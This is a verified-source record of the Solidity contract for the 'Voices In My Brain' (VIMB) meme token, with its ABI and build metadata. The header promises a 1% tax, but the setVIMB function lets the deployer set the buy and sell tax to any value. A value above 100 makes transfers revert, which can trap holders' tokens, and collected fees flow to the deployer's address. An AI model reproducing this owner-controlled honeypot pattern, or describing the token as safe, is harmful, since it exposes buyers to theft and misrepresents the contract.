{"SourceCode": "/*\r\n\r\nA journey through the mind, uncovering the hidden voices that reside within us all - From the Silly to the Profound.\r\n\r\nBring your conversation to life with the expressive collection (sticker) from Voices In My Brain! Add a unique touch to your messages with rare digital expressions of different voices and emotions. Download our TG sticker and elevate your chats.\r\n\r\n1M $VIMB\r\nTAX: 1/1\r\n\r\nTelegram: https://t.me/VIMB_TGPortal\r\nTwitter: https://twitter.com/VoicesIMB_ERC20\r\nWebsite: https://voicesinmybrain.online\r\nTG Sticker: https://t.me/addstickers/voicesinmybrain\r\n\r\n*/\r\n// SPDX-License-Identifier: unlicense\r\n\r\npragma solidity ^0.8.20;\r\n\r\n    interface IUniswapV2Router02 {\r\n        function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            uint amountIn,\r\n            uint amountOutMin,\r\n            address[] calldata path,\r\n            address to,\r\n            uint deadline\r\n            ) external;\r\n        }\r\n        \r\n    contract VoicesInMyBrain {\r\n        string public constant name = \"Voices In My Brain\";  //\r\n        string public constant symbol = \"VIMB\";  //\r\n        uint8 public constant decimals = 18;\r\n        uint256 public constant totalSupply = 1_000_000 * 10**decimals;\r\n\r\n        uint256 BurnToken = 1;\r\n        uint256 SpendToken = 1;\r\n        uint256 constant swapAmount = totalSupply / 100;\r\n\r\n        mapping (address => uint256) public balanceOf;\r\n        mapping (address => mapping (address => uint256)) public allowance;\r\n            \r\n        error Permissions();\r\n            \r\n        event Transfer(address indexed from, address indexed to, uint256 value);\r\n        event Approval(\r\n            address indexed owner,\r\n            address indexed spender,\r\n            uint256 value\r\n        );\r\n            \r\n\r\n        address private pair;\r\n        address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\r\n        address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\r\n        IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(routerAddress);\r\n        address payable constant deployer = payable(address(0x5A37Da97a099567Bf1b1D1E7Fa49F1D96Cf3D48b)); //\r\n\r\n        bool private swapping;\r\n        bool private tradingOpen;\r\n\r\n        constructor() {\r\n            balanceOf[msg.sender] = totalSupply;\r\n            allowance[address(this)][routerAddress] = type(uint256).max;\r\n            emit Transfer(address(0), msg.sender, totalSupply);\r\n        }\r\n\r\n         receive() external payable {}\r\n\r\n        function approve(address spender, uint256 amount) external returns (bool){\r\n            allowance[msg.sender][spender] = amount;\r\n            emit Approval(msg.sender, spender, amount);\r\n            return true;\r\n        }\r\n\r\n        function transfer(address to, uint256 amount) external returns (bool){\r\n            return _transfer(msg.sender, to, amount);\r\n        }\r\n\r\n        function transferFrom(address from, address to, uint256 amount) external returns (bool){\r\n            allowance[from][msg.sender] -= amount;        \r\n            return _transfer(from, to, amount);\r\n        }\r\n\r\n        function _transfer(address from, address to, uint256 amount) internal returns (bool){\r\n            require(tradingOpen || from == deployer || to == deployer);\r\n\r\n            if(!tradingOpen && pair == address(0) && amount > 0)\r\n                pair = to;\r\n\r\n            balanceOf[from] -= amount;\r\n\r\n            if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount){\r\n                swapping = true;\r\n                address[] memory path = new  address[](2);\r\n                path[0] = address(this);\r\n                path[1] = ETH;\r\n                _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n                    swapAmount,\r\n                    0,\r\n                    path,\r\n                    address(this),\r\n                    block.timestamp\r\n                    );\r\n                deployer.transfer(address(this).balance);\r\n                swapping = false;\r\n                }\r\n\r\n            if(from != address(this)){\r\n                uint256 taxAmount = amount * (from == pair ? BurnToken : SpendToken) / 100;\r\n                amount -= taxAmount;\r\n                balanceOf[address(this)] += taxAmount;\r\n            }\r\n                balanceOf[to] += amount;\r\n                emit Transfer(from, to, amount);\r\n                return true;\r\n            }\r\n\r\n        function openTrading() external {\r\n            require(msg.sender == deployer);\r\n            require(!tradingOpen);\r\n            tradingOpen = true;        \r\n            }\r\n\r\n            function _setVIMB(uint256 newBurn, uint256 newSpend) private {\r\n            BurnToken = newBurn;\r\n            SpendToken = newSpend;\r\n            }\r\n\r\n        function setVIMB(uint256 newBurn, uint256 newSpend) external {\r\n            if(msg.sender != deployer)        \r\n                revert Permissions();\r\n            _setVIMB(newBurn, newSpend);\r\n            }\r\n        }", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"Permissions\",\"type\":\"error\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"openTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newBurn\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"newSpend\",\"type\":\"uint256\"}],\"name\":\"setVIMB\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "VoicesInMyBrain", "CompilerVersion": "v0.8.20+commit.a1b79de6", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "Unlicense", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://81e5f66f2a03989c30d92cc375c44e3b33eb92e0ed9f1005df380c339572318d"}